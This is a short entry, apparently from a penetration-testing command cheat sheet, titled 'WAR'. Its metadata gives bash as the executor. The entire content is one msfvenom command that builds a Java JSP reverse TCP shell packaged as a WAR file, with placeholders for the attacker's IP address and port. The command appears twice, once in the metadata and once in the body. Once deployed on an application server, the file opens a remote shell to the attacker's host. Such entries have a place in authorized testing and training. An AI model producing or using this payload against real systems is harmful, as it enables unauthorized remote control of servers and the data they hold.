---
id: 6ba20dd8-95a7-4322-ac60-a4cfb8811676
name: WAR
type: command
executor: bash
data: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -f war > shell.war

  '
output: null
created_at: '2020-07-14T18:14:34.235944+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

```
